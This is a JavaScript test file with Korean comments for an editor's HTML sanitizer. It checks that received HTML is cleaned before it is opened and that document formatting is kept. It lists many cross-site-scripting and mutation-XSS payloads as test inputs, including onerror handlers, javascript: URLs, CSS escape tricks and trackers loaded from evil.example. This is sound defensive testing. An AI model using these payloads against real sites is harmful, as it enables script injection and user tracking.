'use strict';
/* 한글편집기 — 다른 화면이 보낸 «일반 서식» HTML 은 거른 뒤에만 연다 (hangul/js/safehtml.js, 2026-11-22)
   ① 연결: 편집기가 받은 HTML 을 정리 함수에 통과시키고, 정리 함수가 없거나 실패하면 열지 않는다(jsdom 없이도 돈다).
   ② 정리 함수: 실행되는 조각은 걷고 서식은 그대로 둔다 — jsdom 으로 진짜 HTML 을 풀어 본다(CI 는 jsdom 을 깐다).
   node --test tests/hangul-safe-html.test.js */
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const { test } = require('node:test');
const { cutFn } = require('./cut-fn');
let JSDOM = null;
try { JSDOM = require('jsdom').JSDOM; } catch (e) { JSDOM = null; }

const R = path.join(__dirname, '..');
const read = f => fs.readFileSync(path.join(R, f), 'utf8').replace(/\r\n/g, '\n');
const strip = s => s.replace(/\/\*[\s\S]*?\*\//g, ' ').replace(/\n\s*\/\/[^\n]*/g, '\n');
const SAFE_SRC = read('hangul/js/safehtml.js');
const APP = strip(read('hangul/js/app.js'));
const PAGE = read('hangul.html');

test('① 편집기 화면은 정리 함수를 편집기 본체보다 먼저 싣는다', () => {
  const s = PAGE.indexOf('hangul/js/safehtml.js'), a = PAGE.indexOf('hangul/js/app.js');
  assert.ok(s > 0, 'hangul.html 이 safehtml.js 를 싣지 않습니다');
  assert.ok(a > s, 'safehtml.js 는 app.js 보다 먼저 실려야 합니다');
});

// loadFromFundPayload 를 떠서 가짜 창·문서로 돌린다
function runLoad(win) {
  const pre = [/const _bridgeKey = [^\n]*\n/, /const _isPrivateBridgeId = [\s\S]*?\n {2}\};\n/, /const _isPrivateFrom = [^\n]*\n/]
    .map(re => { const m = re.exec(APP); assert.ok(m, '도우미를 못 찾았습니다: ' + re); return m[0]; }).join('');
  const code = pre + 'const _initFrom = "";\nconst _initBid = "";\n' + cutFn(APP, 'async function loadFromFundPayload(');
  const log = { added: [], toasts: [] };
  const fn = new Function('_seenBridgeIds', 'window', 'location', 'BroadcastChannel', 'openBlob', 'addDoc', '_renderFundBridgeBar', 'Hx', 'toast', '_b64ToBytes', 'File', 'console',
    code + '\nreturn loadFromFundPayload;')(
    new Set(), win, { origin: 'https://erp.example' }, undefined, async () => null,
    o => { const d = Object.assign({}, o); log.added.push(d); return d; }, () => {}, { defaultPage: () => ({ margin: {} }) },
    (m, bad) => log.toasts.push({ m, bad }), () => new Uint8Array([1]), function () {}, { warn() {} });
  return { load: fn, log };
}

test('★★★ ① 받은 HTML 은 정리 함수를 거친 «결과» 로 연다', async () => {
  const seen = [];
  const { load, log } = runLoad({ PureunSafeHtml: { clean: h => { seen.push(h); return '<p>거른 것</p>'; } } });
  await load({ sentAt: 1, name: '시험서식', html: '<p>원래</p><img src=x onerror=alert(1)>' });
  assert.deepStrictEqual(seen, ['<p>원래</p><img src=x onerror=alert(1)>'], '정리 함수에 받은 HTML 을 넘겨야 합니다');
  assert.strictEqual(log.added.length, 1);
  assert.strictEqual(log.added[0].html, '<p>거른 것</p>', '거르기 전 HTML 로 열었습니다');
});

test('★★★ ① 정리 함수가 없거나 실패하면 열지 않고 알린다(거르지 않은 HTML 로 열지 않는다)', async () => {
  for (const win of [{}, { PureunSafeHtml: { clean: () => { throw new Error('x'); } } }]) {
    const { load, log } = runLoad(win);
    await load({ sentAt: 2, name: '시험서식', html: '<p>원래</p>' });
    assert.strictEqual(log.added.length, 0, '거르지 못했는데 열었습니다');
    assert.ok(log.toasts.some(t => t.bad), '열지 못했다고 알려야 합니다');
  }
});

// ---------- ② 정리 함수 — jsdom 으로 진짜 HTML 을 풀어 본다 ----------
function cleaner() {
  const dom = new JSDOM('<!doctype html><html><body></body></html>', { runScripts: 'outside-only', url: 'https://erp.example/hangul.html' });
  dom.window.eval(SAFE_SRC);
  return { S: dom.window.PureunSafeHtml, dom };
}
const opt = { skip: JSDOM ? false : 'jsdom 이 없음(CI 는 깐다)' };

test('★★★ ② 실행되는 조각을 걷는다 — 스크립트·이벤트 속성·위험한 주소·끼워 넣는 창', opt, () => {
  const { S } = cleaner();
  const bad = [
    '<script>alert(1)</script>',
    '<img src="x" onerror="alert(1)">',
    '<p onclick="alert(1)" onmouseover="alert(1)">글</p>',
    '<a href="javascript:alert(1)">링크</a>',
    '<a href=" jav&#x09;ascript:alert(1)">링크</a>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '<object data="x.swf"></object><embed src="x.swf">',
    '<svg><script>alert(1)</script><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>',
    '<svg><a xlink:href="javascript:alert(1)"><text>t</text></a></svg>',
    '<svg><animate attributeName="href" to="javascript:alert(1)"/><set attributeName="onmouseover" to="alert(1)"/></svg>',
    '<form action="https://evil.example"><input name="pw"><button formaction="javascript:alert(1)">b</button></form>',
    '<style>body{display:none}</style>',
    '<link rel="stylesheet" href="https://evil.example/x.css"><meta http-equiv="refresh" content="0;url=https://evil.example">',
    '<div style="background:url(javascript:alert(1))">x</div>',
    '<div style="width:expression(alert(1))">x</div>',
    '<svg><use href="https://evil.example/s.svg#x"/></svg>',
    '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
    '<xmp><img src=x onerror=alert(1)></xmp>',
    // 자동 검토(2026-11-22)가 찾은 길 — 편집기 내부 data-*·CSS 이스케이프·닫지 않은 url(·수식 속 주소·다른 사이트 불러오기
    '<span class="hctl" data-hf=\'{"kind":"header","blocks":[{"type":"p","runs":[{"image":{"src":"x\\" onerror=\\"alert(1)"}}]}]}\'></span>',
    '<span class="cmp" data-cmp=\'{"chars":["<img src=x onerror=alert(1)>"]}\'>x</span>',
    '<div style="width:\\65 xpression(alert(1))">x</div>',
    '<div style="background:\\75 rl(\\6a avascript:alert(1))">x</div>',
    '<div style="\\40 import \'//evil.example/x.css\'">x</div>',
    '<div style="background:url(jav&#x09;ascript:alert(1)">x</div>',
    '<div style="background:url(data:text/html,abc">x</div>',
    '<div style="background:url(https://evil.example/track.png)">x</div>',
    '<math><mi href="data:image/svg+xml,&lt;svg onload=alert(1)&gt;">x</mi></math>',
    '<svg><textPath href="https://evil.example/s.svg#x">t</textPath><rect fill="url(https://evil.example/s.svg#x)"/></svg>',
    '<img src="https://evil.example/track.png"><img src="//evil.example/t.png">',
    '<table background="https://evil.example/bg.png"><tr><td>x</td></tr></table>',
    '<div style="position:fixed;top:0;left:0;width:100%;height:100%">가림</div>',
    // 자동 검토 재검토(2026-11-22) — 주석·따옴표·이스케이프로 style 검사를 비켜 가는 길
    '<p style="font-family:\'/*\';background:url(https://evil.example/track.png);position:fixed;content:\'*/\'">x</p>',
    '<p style="background:url(&quot;https://erp.example\'@evil.example/track.png&quot;)">x</p>',
    '<p style="background:url(https://erp.example\\29 @evil.example/track.png)">x</p>',
    '<p style="background-image:url(https://erp.example/a.png), url(https://evil.example/b.png)">x</p>',
    '<p style="position:absolute;top:0;z-index:99999">x</p>',
  ];
  const { dom } = cleaner();
  for (const h of bad) {
    const out = S.clean(h);
    // 편집기가 하는 대로 문서 칸에 풀어서 «요소·속성» 을 본다 (글자로 남은 «&lt;img …» 는 그냥 글이라 괜찮다)
    const box = dom.window.document.createElement('template');
    box.innerHTML = out;
    const els = Array.from(box.content.querySelectorAll('*'));
    const tags = els.map(e => e.localName.toLowerCase());
    for (const t of ['script', 'iframe', 'object', 'embed', 'style', 'link', 'meta', 'form', 'input', 'button', 'foreignobject', 'animate', 'set', 'xmp', 'noscript', 'mglyph', 'svg', 'math', 'textpath']) {
      assert.ok(!tags.includes(t), `걸러지지 않은 요소 <${t}>: ${h} → ${out}`);
    }
    for (const e of els) for (const a of Array.from(e.attributes)) {
      assert.ok(!/^on/i.test(a.name), `이벤트 속성이 남았습니다(${a.name}): ${h} → ${out}`);
      assert.ok(!/^(srcdoc|formaction|action|background)$/i.test(a.name), `위험한 속성이 남았습니다(${a.name}): ${h} → ${out}`);
      assert.ok(!/^data-(?!note$)/i.test(a.name), `편집기 내부 data-* 가 남았습니다(${a.name}): ${h} → ${out}`);
      assert.doesNotMatch(a.value, /javascript|data:text\/html|expression|evil\.example|@import|position:\s*(fixed|absolute|sticky)|z-index|\\/i, `위험한 값이 남았습니다(${a.name}): ${h} → ${out}`);
    }
  }
});

test('★★★ ② 서식은 그대로 둔다 — 글꼴·크기·색·표·칸 합치기·테두리·쪽 나눔·그림·편집기 표시', opt, () => {
  const { S, dom } = cleaner();
  const keep = '<p style="text-align:center;font-family:\'함초롬바탕\';font-size:14pt"><b>제목</b> <span style="color:#c00">빨강</span></p>'
    + '<table style="border-collapse:collapse;width:100%"><colgroup><col style="width:30%"></colgroup><tbody>'
    + '<tr><td colspan="2" rowspan="1" style="border:1px solid #000;padding:2mm">칸</td></tr></tbody></table>'
    + '<hr class="page-break" contenteditable="false">'
    + '<img src="data:image/png;base64,iVBORw0KGgo=" style="width:30mm">'
    + '<img src="img/stamp.png" alt="도장"><img src="https://erp.example/img/logo.png" alt="로고">'
    + '<div style="position:relative;background-image:url(data:image/png;base64,iVBORw0KGgo=)">배경</div>'
    + '<p style="scroll-behavior:smooth;color:#00c">파랑</p>'
    + '<p>각주<sup class="note" contenteditable="false" data-kind="end" data-note="&lt;p&gt;미주 글&lt;/p&gt;">※</sup></p>'
    + '<p data-pb="1">쪽 나눔</p><p data-cb="1">단 나눔</p><p data-newpage="1" data-kept="1"></p>'
    + '<table><tbody><tr><td data-border="SOLID,0.12,#000000;SOLID,0.12,#000000;SOLID,0.4,#000000;NONE,0.12,#000000" data-dir="v" data-hh="2834">칸</td></tr></tbody></table>'
    + '<a href="https://www.law.go.kr/">법령</a>';
  const out = S.clean(keep);
  const box = dom.window.document.createElement('div');
  box.innerHTML = out;
  const q = s => box.querySelector(s);
  const css = (el, p) => (el && el.style ? el.style.getPropertyValue(p) : '');
  const p0 = q('p');
  assert.strictEqual(css(p0, 'text-align'), 'center', '가운데 정렬이 빠졌습니다: ' + out);
  assert.ok(css(p0, 'font-size') === '14pt' && /함초롬바탕/.test(css(p0, 'font-family')), '글꼴·크기가 빠졌습니다: ' + out);
  assert.ok(q('b') && css(q('span'), 'color'), '글자 서식이 빠졌습니다: ' + out);
  const td0 = q('td[colspan="2"]');
  assert.ok(td0 && css(td0, 'border-top-style') === 'solid' && css(td0, 'padding-left') === '2mm', '표 칸 테두리·여백이 빠졌습니다: ' + out);
  assert.ok(css(q('col'), 'width') === '30%' && css(q('table'), 'border-collapse') === 'collapse', '표 서식이 빠졌습니다: ' + out);
  assert.ok(q('hr.page-break[contenteditable="false"]'), '쪽 나눔이 빠졌습니다');
  assert.ok(q('img[src^="data:image/png"]'), '그림(data 주소)이 빠졌습니다');
  assert.ok(q('img[src="img/stamp.png"]') && q('img[src="https://erp.example/img/logo.png"]'), '같은 사이트 그림이 빠졌습니다');
  const bg = Array.from(box.querySelectorAll('div')).find(d => d.textContent === '배경');
  assert.ok(css(bg, 'position') === 'relative' && /data:image\/png/.test(css(bg, 'background-image')), '안전한 배경·위치 서식이 빠졌습니다: ' + out);
  const blue = Array.from(box.querySelectorAll('p')).find(p => p.textContent === '파랑');
  assert.ok(css(blue, 'color'), '모르는 속성(scroll-behavior) 하나 때문에 다른 서식까지 빠졌습니다: ' + out);
  assert.ok(q('sup.note[data-kind="end"][data-note]'), '미주 구분이 빠졌습니다(각주로 바뀜)');
  assert.ok(q('p[data-pb="1"]') && q('p[data-cb="1"]') && q('p[data-newpage="1"]'), '쪽·단 나누기 표시가 빠졌습니다');
  assert.ok(q('td[data-border^="SOLID"][data-dir="v"][data-hh="2834"]'), '칸 테두리·글자 방향·높이 표시가 빠졌습니다');
  assert.ok(q('a[href="https://www.law.go.kr/"]'), '안전한 링크가 빠졌습니다');
  assert.ok(box.textContent.includes('제목') && box.textContent.includes('칸'), '글이 빠졌습니다');
});

test('★★ ② 모르는 요소는 껍데기만 걷고 글은 남긴다 · id·name 은 지운다(편집기 화면 요소와 겹치지 않게)', opt, () => {
  const { S } = cleaner();
  const out = S.clean('<custom-box><p id="menubar" name="x">남을 글</p></custom-box><blink>깜빡</blink>');
  assert.match(out, /남을 글/);
  assert.match(out, /깜빡/);
  assert.doesNotMatch(out, /custom-box|blink|\sid=|\sname=/i, out);
});

test('★★★ ② 각주 본문(data-note — 나중에 HTML 로 다시 그려진다)도 거른다', opt, () => {
  const { S, dom } = cleaner();
  const note = '<p>각주 글</p><img src=x onerror=alert(1)><script>alert(1)</script>';
  const html = '<p>본문<sup class="note" contenteditable="false" data-note="' + note.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;') + '">※</sup></p>';
  const out = S.clean(html);
  const box = dom.window.document.createElement('div');
  box.innerHTML = out;
  const v = box.querySelector('sup.note').getAttribute('data-note');
  assert.match(v, /각주 글/, '각주 글이 빠졌습니다');
  assert.doesNotMatch(v, /onerror|<script/i, '각주 본문이 걸러지지 않았습니다: ' + v);
});

test('② 주소 판정 — 상대 주소·http(s) 는 되고, javascript·vbscript·글 data 주소는 안 된다', opt, () => {
  const { S } = cleaner();
  for (const ok of ['#a', 'doc.html', '/x/y', 'https://a.example/b', 'http://a.example']) assert.ok(S.safeUrl(ok, false), ok);
  assert.ok(S.safeUrl('mailto:a@b.example', false));
  assert.ok(S.safeUrl('data:image/png;base64,AAAA', true));
  for (const no of ['javascript:alert(1)', ' JaVaScRiPt:alert(1)', 'java\nscript:alert(1)', 'vbscript:x', 'data:text/html,<script>', 'blob:https://a/b']) {
    assert.ok(!S.safeUrl(no, true), no);
    assert.ok(!S.safeUrl(no, false), no);
  }
  assert.ok(!S.safeUrl('data:image/png;base64,AAAA', false), '글 링크(a)에는 data 주소를 두지 않습니다');
  // 저절로 불러오는 그림은 같은 사이트·그림 data 주소만 — 다른 사이트에서 불러와 열람을 알리지 않게
  assert.ok(S.safeUrl('https://erp.example/a.png', true));
  assert.ok(!S.safeUrl('https://evil.example/a.png', true));
  assert.ok(!S.safeUrl('//evil.example/a.png', true));
});

test('★★ ② 거른 결과를 다시 걸러도 같다(되풀이해도 모양이 안 바뀐다)', opt, () => {
  const { S } = cleaner();
  const h = '<p style="color:red">가<b>나</b></p><table><tbody><tr><td colspan="2">칸</td></tr></tbody></table><sup class="note" data-note="&lt;p&gt;각주&lt;/p&gt;">※</sup>';
  const once = S.clean(h);
  assert.strictEqual(S.clean(once), once);
});
